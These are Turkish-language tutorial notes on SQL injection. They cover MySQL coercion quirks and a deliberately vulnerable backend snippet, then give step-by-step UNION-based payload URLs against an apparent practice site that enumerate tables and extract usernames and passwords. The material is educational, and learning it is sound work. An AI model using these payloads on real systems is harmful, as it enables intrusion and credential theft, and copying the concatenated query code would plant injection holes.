# SQL Injection nedir?
Saldırganların yazdığınız web uygulamasını / web yazılımını kullanarak veritabanında kendi SQL sorgularını çalıştırabilme işidir.

# MySQL Sorguları
ÜST KOLON ADI - ALTI VERİSİ
|Sorgu|Sonuç|Sebep|
|---|---|---|
|SELECT 1;|1||
|SELECT 2-1;|1||
|SELECT 2+1;|3||
|SELECT '2-1';|2-1||
|SELECT '2'-'1';|1||
|SELECT '2'+'1';|3||
|SELECT '2'+'a';|2|'2' ifadesini integer değere çevirdi ancak 'a' ifadesini integer yapamadı. Bu yüzden 0 aldı.|
|SELECT '2'-'a';|2||
|SELECT 'b'+'a';|0|Yine yukarıda geçen şekilde b ve a değerlerini integer yapamadı bu sebeple 0 değerlerini aldılar.|
|SELECT '2' '1';|21|Boşluğu String Concatenation olarak kullandı.|
|SELECT concat('2','1');||
|SELECT '2' '1' 'a';|21a||
|SELECT '2' '1' 'a'-1;|20|'a'-1 ifadesinin sonucu -1 çünkü a=0 -> '2' '1' -1 burada da '1'-1 işleminin sonucu 0. '2' ile de 0 concatenation yapılıyor ve 20 çıkıyor.|
|SELECT 2^1;|3|Bu ifade toplama anlamına gelmiyor. Bu bir XOR operator|
|SELECT 2^2;|2||
|SELECT !1;|0||
|SELECT ~1;|18446744073709551614|max integer input|


## Örnek için DB oluşturuyoruz
1. ```create database test;``` test veritabanı oluşturduk
2. tablo oluşturuyoruz
3. ```use test;```
4.
 ```CREATE TABLE users (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
firstname VARCHAR(30) NOT NULL,
lastname VARCHAR(30) NOT NULL
);

``` 
5. ```INSERT INTO users (firstname,lastname) VALUEs ('mehmet','ince');```
6. ```select * from users;```
7. ```INSERT INTO users (firstname,lastname) VALUEs ('mehmet ','ince');```
8. ```INSERT INTO users (firstname,lastname) VALUEs ('mehmet  ','ince');```
9. ```INSERT INTO users (firstname,lastname) VALUEs ('mehmet   ','ince');```
10. 7,8 ve9. adımda mehmet değerlerimizin sonlarına boşluklar ekleyerek tekrar kaydettik. Her birinde bir öncekinden bir fazla boşluk var.
11. ```select * from users; 
12. 4 adet mehmet ince kullanıcısını gördük.
13. ```select * from users WHERE firstname = 'mehmet'; ```
14. Bize tüm mehmetleri getirdi. Değerin sonunda boşluk olup olmaması önemli değildir. Veritabanına ekleme yaparken boşluk olduğu için yeni bir değer olarak görülüp kaydediliyor ancak select ile sorgu yapıp değeri çağırırken boşluk olup olmamasına bakılmıyor. 



# SQL Injection'a giriş yapıyoruz
``` 
SALDIRGANIN BAKIŞ AÇISI 

www.x.com/?id=1  

SELECT * FROM haberler WHERE id = 1

RESPONSE

<html>
MDISEC -> bize dönen haberin başlığı
</html>

www.x.com/?id=2  

SELECT * FROM haberler WHERE id = 2 

RESPONSE

<html>
LUNIZZ
</html>

www.x.com/?id=2-1

SELECT * FROM haberler WHERE id = 2-1 

RESPONSE

<html>
MDISEC
</html>

yani www.x.com/?id=1 ve www.x.com/?id=2-1 aynı sonucu döndürüyor. SQL sorgusunda matematik işlemi yapabildik.


www.x.com/?id=ahsdjahsdkjhasd -> buraya ne yazarsak sorgunun sonuna o eklenir.

SELECT * FROM haberler WHERE id = ahsdjahsdkjhasd

RESPONSE

<html>
MDISEC
</html>




=================================



Response'da tetiklenen backend

id = request.get('id')

query = "SELECT * FROM haberler WHERE id ="+id -> sorgumuz

result = db.execute(query) -> sonuç

if result.size() > 0:  -> demek ki veritabanından bir veri döndü
  for i in result:
    print(i.title) -> dönen verinin title'ını başlığını yazdırıyoruz.
else: -> veritabanından veri dönmüyorsa.
  print("haber yok")
  
  
  

```




************************** UNION SQLi **************************

Artık SQL Injection zafiyetinin farkına vardık. Kendi sorgularımızı yazmamız gerekiyor. Bunu da UNION ile yapabiliriz. Union ile yazdığımız iki sorguda da kolon sayıları eşit olmak zorunda.


http://testphp.vulnweb.com/listproducts.php?cat=1 -> zafiyetli bir site.

SELECT * FROM haberler WHERE id = 1 UNION SELECT 1 
yazdık çünkü biliyoruz ki SELECT 1 çalışır. Ve üstteki sitede hata aldık. Bu kolon sayılarının aynı olmadığı anlamına geliyor. (1)  Sayıyı sürekli artıracağız ta ki referans noktamıza gelene kadar

SELECT * FROM haberler WHERE id = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 ve referans noktamıza döndük 
http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11

TRICK #1
Artırmayı yaparken öncelikle 2-1 ile SQL injectionın varlığını tespit etmek gerekiyor.

TRICK #2  
Referans sayfasının ve kendi select sorgu sonucumuzda gelen sayfaların en sonuna iniyoruz. Bir fark var. Referansta en sonda trees varken kendi sorgumuzda en sonda 7,2,9 geliyor.

Bunun anlamı : 
SELECT * FROM haberler WHERE id = 1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 bundaki ilk select sorgusunun 7. 2. ve 9. kolonlarında dönen indisleri uygulama, ekrana yazdır demektir.

7'de helper fonksiyon çağırırsak eğer:
SELECT * FROM haberler WHERE id = 1 UNION SELECT 1,2,3,4,5,6,version(),8,9,10,11 şeklinde. sayfanın en altında 7 yazan yerde artık versiyon bilgisini alırız.


Ekranda kalabalık istemiyorsak ilk select sorgumuz bize bir şey getirmesin sadece kendi sorgumuzun sonuçlarını görelim istersek 

SELECT * FROM haberler WHERE id = -99999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 yazabiliriz. Çünkü bu id'ye sahip bir değer yoktur. Sadece kendi sorgularımız ekranda gözükür.



SELECT * FROM haberler WHERE id = -99999999 UNION SELECT 1,2,3,4,5,6,database(),8,9,10,11 -> mevcuttaki database adı 
sitedeki karşılığı:
http://testphp.vulnweb.com/listproducts.php?cat=-999999999 UNION SELECT 1,2,3,4,5,6,database(),8,9,10,


artık from sorgusu yapabiliriz ama ne yazacağız ? tablo adını bulmalıyız. 
İlişkisel her veritabanı sisteminde o sistemdeki tablo, kolon isimlerini barındıran bir sistem bilgi tablosu vardır. 

SELECT * FROM haberler WHERE id = -99999999 
UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = database()

test sitesinde denersek: 
http://testphp.vulnweb.com/listproducts.php?cat=-999999999 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = database()

http://testphp.vulnweb.com/listproducts.php?cat=-999999999 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name = 'users'

uname pass gibi kısımları görmeye başladık.

http://testphp.vulnweb.com/listproducts.php?cat=-999999999 UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users -> kullanıcı adı = test
http://testphp.vulnweb.com/listproducts.php?cat=-999999999 UNION SELECT 1,2,3,4,5,6,pass,8,9,10,11 FROM users -> parola = test

http://testphp.vulnweb.com/listproducts.php?cat=-999999999 UNION SELECT 1,2,3,4,5,6,concat(uname,':MDISEC:',pass),8,9,10,11 FROM users

REGEX:
(.*)::MDISEC::(.*)   programlamatik şekilde yukarıdakini çekebiliriz. 

==========

BACKEND
```
(1) örneğinde kolon sayılarının aynı olmadığın bize söyleyen bir hata aldık. Bunun gibi hatalar diğer sitelerde kapalıdır. Örnek kodu da aşağıdaki gibidir.


id = request.get('id')

query = "SELECT * FROM haberler WHERE id ="+id -> sorgumuz
try:
  result = db.execute(query)
except Exception as e:
  pass

if result.size() > 0:  -> demek ki veritabanından bir veri döndü
  for i in result:
    print(i.title) -> dönen verinin title'ını başlığını yazdırıyoruz.
else: -> veritabanından veri dönmüyorsa.
  print("haber yok")
```
